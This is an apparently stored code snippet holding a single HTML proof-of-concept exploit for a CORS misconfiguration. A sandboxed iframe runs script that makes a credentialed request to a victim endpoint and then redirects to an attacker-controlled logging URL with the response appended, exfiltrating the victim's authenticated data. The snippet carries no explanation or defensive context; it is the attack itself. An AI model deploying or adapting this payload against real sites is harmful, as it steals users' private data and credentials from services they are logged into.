---
id: 0f90da12-e2e8-4a04-8c06-161ee0be4f5c
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:55:55.047221+00:00'
updated_at: '2023-04-06T03:55:55.050883+00:00'
---

# Code Snippet 0f90da12

**Language**: HTML

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```


